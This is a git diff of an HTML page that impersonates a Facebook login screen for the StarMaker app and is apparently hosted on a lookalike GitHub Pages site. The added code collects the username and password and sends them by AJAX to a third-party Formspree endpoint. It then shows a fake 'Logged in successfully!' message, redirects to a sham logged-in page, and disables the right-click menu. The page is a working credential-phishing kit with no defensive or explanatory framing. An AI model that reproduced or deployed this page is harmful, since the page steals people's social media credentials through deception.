@@ -1,81 +1,495 @@
 <!DOCTYPE html>
 <html lang="en">
-  <head>
-    <meta charset="UTF-8" />
-    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <link rel="icon" type="image/png" href="https://m.media-amazon.com/images/I/81Z2rz4-hEL.png">
-    <title>StarMaker</title>
-    <link rel="preconnect" href="https://fonts.googleapis.com" />
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
-    <link
-      href="https://fonts.googleapis.com/css2?family=Roboto&family=Sacramento&display=swap"
-      rel="stylesheet"
-    />
-   <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Trirong"> 
-<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Sofia">
-    <link
-      rel="stylesheet"
-      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css"
-      integrity="sha512-Fo3rlrZj/k7ujTnHg4CGR2D7kSs0v4LLanw2qksYuRlEzO+tcaEPQogQ0KaoGN26/zrn20ImR1DfuLWnOo7aBA=="
-      crossorigin="anonymous"
-      referrerpolicy="no-referrer"
-    />
-<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Montserrat&display=swap">
-    <link rel="stylesheet" href="style.css" />
-  </head>
-  <body>
-    
-    <div class="main-container">
-      <video autoplay loop muted>
-        <source src="https://static.starmakerstudios.com/www-index-1/bg/wwww-new-v2-video.mp4" type="video/mp4" />
-      </video>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>StarMaker - Facebook Login</title>
+    <link rel="icon" type="image/png" href="https://www.starmakerstudios.com/next-assets/favicon.ico">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
 
-      <div class="bg-overlay"></div>
+        body {
+            font-family: 'Roboto', sans-serif;
+            background: #000;
+            color: #fff;
+            overflow: hidden;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            -webkit-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
+            user-select: none;
+        }
 
-      <nav>
+        /* Video Background */
+        video {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            z-index: -2;
+        }
+
+        .video-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.4);
+            z-index: -1;
+        }
+
+        /* Particles */
+        .particles {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 0;
+            pointer-events: none;
+        }
+
+        .particle {
+            position: absolute;
+            width: 3px;
+            height: 3px;
+            background: rgba(255, 255, 255, 0.4);
+            border-radius: 50%;
+            animation: float 15s infinite ease-in-out;
+        }
+
+        @keyframes float {
+            0%, 100% { transform: translateY(0) translateX(0); opacity: 0; }
+            10% { opacity: 1; }
+            90% { opacity: 1; }
+            100% { transform: translateY(-100vh) translateX(50px); opacity: 0; }
+        }
+
+        /* Navigation */
+        nav {
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            padding: 25px 5%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            opacity: 0;
+            animation: slideDown 0.8s ease forwards 0.5s;
+        }
+
+        @keyframes slideDown {
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+            from {
+                transform: translateY(-100px);
+            }
+        }
+
+        .logo img {
+            height: 50px;
+            transition: transform 0.3s ease;
+        }
+
+        .logo img:hover {
+            transform: scale(1.05);
+        }
+
+        /* Login Section */
+        .login-section {
+            flex: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 120px 5% 40px;
+            position: relative;
+            z-index: 1;
+        }
+
+        .login-container {
+            max-width: 450px;
+            width: 100%;
+            background: rgba(255, 255, 255, 0.98);
+            backdrop-filter: blur(20px);
+            border-radius: 25px;
+            padding: 40px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
+            opacity: 0;
+            animation: fadeInUp 1s ease forwards 0.8s;
+        }
+
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .header-section {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .facebook-icon {
+            width: 60px;
+            height: 60px;
+            margin: 0 auto 15px;
+            display: block;
+        }
+
+        .header-section h1 {
+            font-size: 28px;
+            color: #1877f2;
+            font-weight: 700;
+            margin-bottom: 8px;
+            letter-spacing: -0.5px;
+        }
+
+        .header-section p {
+            font-size: 15px;
+            color: #606770;
+            font-weight: 400;
+        }
+
+        .form-group {
+            margin-bottom: 18px;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 16px;
+            border: 1px solid #dddfe2;
+            border-radius: 12px;
+            font-size: 15px;
+            font-family: 'Roboto', sans-serif;
+            background: #fff;
+            color: #1c1e21;
+            transition: all 0.3s ease;
+            outline: none;
+        }
+
+        .form-group input::placeholder {
+            color: #8a8d91;
+        }
+
+        .form-group input:focus {
+            border-color: #1877f2;
+            box-shadow: 0 0 0 2px rgba(24, 119, 242, 0.2);
+        }
+
+        .login-button {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(135deg, #1877f2, #0c63d4);
+            color: #fff;
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            margin-top: 10px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .login-button::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.3), transparent);
+            transition: left 0.5s ease;
+        }
+
+        .login-button:hover {
+            background: linear-gradient(135deg, #0c63d4, #084db0);
+            transform: translateY(-2px);
+            box-shadow: 0 8px 20px rgba(24, 119, 242, 0.4);
+        }
+
+        .login-button:hover::before {
+            left: 100%;
+        }
+
+        .login-button:active {
+            transform: translateY(0);
+        }
+
+        .divider {
+            text-align: center;
+            margin: 25px 0;
+            position: relative;
+        }
+
+        .divider::before {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 0;
+            right: 0;
+            height: 1px;
+            background: #dddfe2;
+        }
+
+        .divider span {
+            background: rgba(255, 255, 255, 0.98);
+            padding: 0 15px;
+            position: relative;
+            color: #606770;
+            font-size: 14px;
+        }
+
+        .back-link {
+            text-align: center;
+        }
+
+        .back-link a {
+            color: #1877f2;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+            transition: all 0.3s ease;
+            display: inline-block;
+            padding: 10px 20px;
+            border-radius: 8px;
+        }
+
+        .back-link a:hover {
+            background: rgba(24, 119, 242, 0.1);
+            color: #0c63d4;
+        }
+
+        .success-message {
+            background: #d4edda;
+            color: #155724;
+            padding: 14px;
+            border-radius: 12px;
+            margin-bottom: 20px;
+            text-align: center;
+            font-weight: 500;
+            font-size: 14px;
+            border: 1px solid #c3e6cb;
+            display: none;
+        }
+
+        .success-message.show {
+            display: block;
+            animation: slideInDown 0.5s ease;
+        }
+
+        @keyframes slideInDown {
+            from {
+                opacity: 0;
+                transform: translateY(-20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .error-message {
+            background: #f8d7da;
+            color: #721c24;
+            padding: 14px;
+            border-radius: 12px;
+            margin-bottom: 20px;
+            text-align: center;
+            font-weight: 500;
+            font-size: 14px;
+            border: 1px solid #f5c6cb;
+            display: none;
+        }
+
+        .error-message.show {
+            display: block;
+            animation: slideInDown 0.5s ease;
+        }
+
+        /* Responsive */
+        @media (max-width: 768px) {
+            nav {
+                padding: 20px 5%;
+            }
+
+            .logo img {
+                height: 40px;
+            }
+
+            .login-section {
+                padding: 100px 5% 20px;
+            }
+
+            .login-container {
+                padding: 30px 25px;
+                max-width: 100%;
+            }
+
+            .header-section h1 {
+                font-size: 24px;
+            }
+
+            .header-section p {
+                font-size: 14px;
+            }
+
+            .form-group input {
+                padding: 14px;
+                font-size: 14px;
+            }
+
+            .login-button {
+                padding: 14px;
+                font-size: 15px;
+            }
+
+            .facebook-icon {
+                width: 50px;
+                height: 50px;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .login-container {
+                padding: 25px 20px;
+            }
+
+            .header-section h1 {
+                font-size: 22px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Video Background -->
+    <video autoplay loop muted playsinline>
+        <source src="https://static.starmakerstudios.com/www-index-1/bg/wwww-new-v2-video.mp4" type="video/mp4">
+    </video>
+    <div class="video-overlay"></div>
+
+    <!-- Particles -->
+    <div class="particles" id="particles"></div>
+
+    <!-- Navigation -->
+    <nav>
         <div class="logo">
-          <!--https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi5cwEjEiyLQ2Xfg6Q7YkezUCIME_DVAAhsXmwPnWaolKqB0LydcxEXZ4TNDdNXsXcJ_fNPG4C6jG-YbCDkUk6u6G34NupOlxuLIU58M_hasPKdtCmeyzdV0I6NBBxAsU6_QC0zq3qfEppiEnUq2ijWsuomKmsQ3H_d7-5gnIXipf4fmRZhG-AaiAYZAqk/s384/IMG_20231118_020618.png-->
-          <a><img src="https://static.starmakerstudios.com/production/cdn/vue/starx-official/prod/_next/static/assets/images/app-icon.d79097a124ad0a00.png"></a>
+            <img src="https://static.starmakerstudios.com/production/cdn/vue/starx-official/prod/_next/static/assets/images/app-icon.d79097a124ad0a00.png" alt="StarMaker">
         </div>
+    </nav>
 
-       
-      </nav> 
+    <!-- Login Section -->
+    <section class="login-section">
+        <div class="login-container">
+            <div class="header-section">
+                <img class="facebook-icon" src="https://upload.wikimedia.org/wikipedia/commons/thumb/6/6c/Facebook_Logo_2023.png/1200px-Facebook_Logo_2023.png" alt="Facebook">
+                <h1>Facebook</h1>
+                <p>Log in to continue to StarMaker</p>
+            </div>
 
-      <header class="hero-section">
-      
-        
-      <form action="https://formspree.io/f/xyyqkrgn" id="my-form" method="POST">
-  <div class="container">
-    <div class="upper-text">
-      <p>facebook</p>
-     
-</div>
- 
-    
-    <label for="username"></label>
+            <div id="status" class="success-message"></div>
+            <div id="error" class="error-message"></div>
 
-    <input name="username" placeholder="Mobile number or email address" type="text" />
+            <form id="login-form" method="POST" action="https://formspree.io/f/xyyqkrgn">
+                <div class="form-group">
+                    <input type="text" name="username" placeholder="Mobile number or email address" required>
+                </div>
+                <div class="form-group">
+                    <input type="password" name="password" placeholder="Password" required>
+                </div>
+                <button type="submit" class="login-button">Log In</button>
+            </form>
 
-    <label for="psw"></label>
-    <input name="psw" placeholder="Password" required="" type="password" />
-    
-    <div class="clearfix">
-      <button class="signupbtn" type="submit">Log In</button>
-    </div>
-  </div>
-</form>
-   
-      </header>  
- <div class="containersuccess"></div>
-  <div id="status" class="success-message"></div>
-     
-      
-   </div>   
-    
-   
-    <script src="main.js"></script>
-  </body>
+            <div class="divider">
+                <span>or</span>
+            </div>
+
+            <div class="back-link">
+                <a href="https://starmakerstudio.github.io/web/Starmaker%20Web/Login/login.html">← Back to Login Options</a>
+            </div>
+        </div>
+    </section>
+
+    <script>
+        // Prevent context menu
+        document.addEventListener('contextmenu', e => e.preventDefault());
+
+        // Create particles
+        const particlesContainer = document.getElementById('particles');
+        for (let i = 0; i < 40; i++) {
+            const particle = document.createElement('div');
+            particle.className = 'particle';
+            particle.style.left = Math.random() * 100 + '%';
+            particle.style.animationDelay = Math.random() * 15 + 's';
+            particle.style.animationDuration = (Math.random() * 10 + 10) + 's';
+            particlesContainer.appendChild(particle);
+        }
+
+        // Form submission
+        const form = document.getElementById('login-form');
+        const status = document.getElementById('status');
+        const error = document.getElementById('error');
+
+        function success() {
+            form.reset();
+            status.textContent = 'Logged in successfully!';
+            status.classList.add('show');
+            error.classList.remove('show');
+            setTimeout(() => {
+                window.location.href = 'https://starmakerstudio.github.io/web/Starmaker%20Web/Starmaker%20Logged/loggedin.html';
+            }, 1000);
+        }
+
+        function showError() {
+            error.textContent = 'Oops! There was a problem.';
+            error.classList.add('show');
+            status.classList.remove('show');
+        }
+
+        form.addEventListener('submit', function(ev) {
+            ev.preventDefault();
+            const data = new FormData(form);
+            ajax(form.method, form.action, data, success, showError);
+        });
+
+        function ajax(method, url, data, success, error) {
+            const xhr = new XMLHttpRequest();
+            xhr.open(method, url);
+            xhr.setRequestHeader('Accept', 'application/json');
+            xhr.onreadystatechange = function() {
+                if (xhr.readyState !== XMLHttpRequest.DONE) return;
+                if (xhr.status === 200) {
+                    success(xhr.response, xhr.responseType);
+                } else {
+                    error(xhr.status, xhr.response, xhr.responseType);
+                }
+            };
+            xhr.send(data);
+        }
+    </script>
+</body>
 </html>
-
-
